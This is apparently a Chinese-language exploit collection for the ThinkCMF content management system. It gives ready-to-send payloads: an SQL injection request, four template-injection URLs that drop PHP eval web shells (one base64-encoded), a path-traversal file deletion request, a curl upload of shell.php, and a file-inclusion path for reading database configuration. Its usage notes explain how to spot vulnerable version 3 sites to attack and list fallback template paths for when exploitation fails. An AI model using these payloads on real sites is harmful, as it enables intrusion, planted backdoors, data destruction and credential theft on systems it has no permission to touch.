## ThinkCMF漏洞全集和  
> ...持续收集,欢迎贡献  

- 前台SQL注入:  
> 需要普通用户权限，默认可注册  
> paylaod:  

```raw
POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1
Host: localhost
Connection: close
Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95
Content-Type: application/x-www-form-urlencoded
Content-Length: 79

post[id][0]=bind&post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+-

```
> 还有以下可以测试：  
```raw
post:
term:123
post[post_title]:123
post[post_title]:aaa
post_title:123
post[id][0]:bind
```

- 前台模版注入漏洞-可getshell四处  

```raw
# 仅在Windows环境测试
# 第一处  
http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch&templateFile=/../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval($_POST[_])%3b');?>&prefix=
# 第二处  
http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval($_POST[_])%3b');?>&prefix=

# 第三处  
/index.php?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>

# 第四处
/index.php?a=fetch&content=<?php+file_put_contents("mrxn.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg=="));

```

- 任意文件删除-只能windows删除  
> 在用户上传头像处存在任意文件删除漏洞，发送如下数据包后，会删除网站根目录下一个名为 test.txt 的文件。（该漏洞仅能在 Windows 下触发）  
```
POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1
Host: localhost
Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

imgurl=..\..\..\test.txt
```

- 任意文件上传  
> 在 ThinkCMFX2.2.3 最终版中，存在一处任意文件上传（需要普通用户权限，默认可注册）  
` curl -F "file=@/tmp/shell.php" -X "POST" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile'
`

- 任意文件包含（读取数据库配置等等）  
`/index.php?a=display&templateFile=README.md`

### 使用说明  
> thinkcmf 并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。
1.看logo 3的logo是黄色的.
2.在网站url 后面输入 admin,如果页面是蓝色的表示是3的，可日穿之.
3.查看 README.md 在网站url后面输入README.md.
> 另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个`模板不存在`错:
```raw
url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch
post:
templateFile=/../public/index
prefix=''
content=<php>file_put_contents('test.php','<?php eval($_REQUEST[11]);')</php>
```
请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可
```
例如：
/../public/index
/../public/exception
/../data/index
/../data/runtime/index
/../plugins/Mobileverify/View/admin_index
/../plugins/Mobileverify/View/index
/../plugins/Mobileverify/View/widget
/../plugins/Demo/View/admin_index
/../plugins/Demo/View/index
/../plugins/Demo/View/widget
/../application/Install/View/Public/footer
/../application/Install/View/Public/head
/../application/Install/View/Public/header
/../application/Common/index
/../application/Portal/Lang/en-us/index
/../application/Api/Lang/en-us/index
/../application/Api/Lang/zh-cn/index
/../application/Comment/Lang/en-us/index
/../application/Comment/Lang/zh-cn/index
```

```
url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch
post:
templateFile=/../../../public/index
prefix=''
content=<php>file_put_contents('test1.php','<?php eval($_REQUEST[11]);')</php>
```
```
/../../../public/index
/../../../public/exception
/../../../data/index
/../../../data/runtime/index
/../../../plugins/Mobileverify/View/admin_index
/../../../plugins/Mobileverify/View/index
/../../../plugins/Mobileverify/View/widget
/../../../plugins/Demo/View/admin_index
/../../../plugins/Demo/View/index
/../../../plugins/Demo/View/widget
/../../../application/Install/View/Public/footer
/../../../application/Install/View/Public/head
/../../../application/Install/View/Public/header
/../../../application/Common/index
/../../../application/Portal/Lang/en-us/index
/../../../application/Api/Lang/en-us/index
/../../../application/Api/Lang/zh-cn/index
/../../../application/Comment/Lang/en-us/index
/../../../application/Comment/Lang/zh-cn/index
```
> 还有最后一句废话：模版注入对于linux 并不好用 : )  

参考：  
https://xz.aliyun.com/t/3409
https://xz.aliyun.com/t/3529 
https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0